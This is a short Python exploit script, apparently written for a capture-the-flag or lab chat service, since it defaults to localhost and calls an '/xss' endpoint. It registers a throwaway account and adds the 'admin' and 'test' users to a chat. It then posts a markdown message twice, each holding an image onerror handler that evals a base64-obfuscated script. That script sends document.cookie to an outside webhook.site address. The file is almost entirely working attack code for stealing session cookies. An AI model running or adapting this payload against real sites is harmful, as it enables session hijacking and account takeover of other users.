#!/usr/bin/env python3

import sys
import requests
import secrets
import base64
import time

s = requests.session()

login = secrets.token_hex(16)
password = secrets.token_hex(16)

print(login, password)

url = 'http://localhost:8080' if len(sys.argv) < 2 else sys.argv[1]

s.post(url + '/xss').raise_for_status()
s.post(url + '/api/user/register', json={'login': login, 'password': password}).raise_for_status()
s.post(url + '/api/user/login', json={'login': login, 'password': password}).raise_for_status()
resp = s.get(url + '/api/user/me')
print(resp, resp.text)

important_chat = '__test_emergency_chat'
s.post(url + '/api/chat/add', json={'user': login, 'chat': important_chat}).raise_for_status()
print('add admin to chat', s.post(url + '/api/chat/add', json={'user': 'admin', 'chat': important_chat}))
print('add test to chat', s.post(url + '/api/chat/add', json={'user': 'test', 'chat': important_chat}))

payload = f'''
window.location.href = 'https://webhook.site/df3d421c-00d0-415b-8d17-040d19bc3e43/' + document.cookie
'''
payload_encoded = base64.b64encode(payload.encode()).decode()
onerror = f"eval(atob('{payload_encoded}'))"
sploit = f'''
test
```plain
<img src="http://example.com/image.png" onerror="{onerror}"></img>
<div> test div here </div>
```
**bold**
'''
print('send msg')
s.post(url + '/api/chat/send', json={'content': sploit, 'chat': important_chat, 'from': '', 'replyTo': '', 'id': '', 'important': ''}).raise_for_status()

time.sleep(1)
print('send second msg')
s.post(url + '/api/chat/send', json={'content': sploit, 'chat': important_chat, 'from': '', 'replyTo': '', 'id': '', 'important': ''}).raise_for_status()
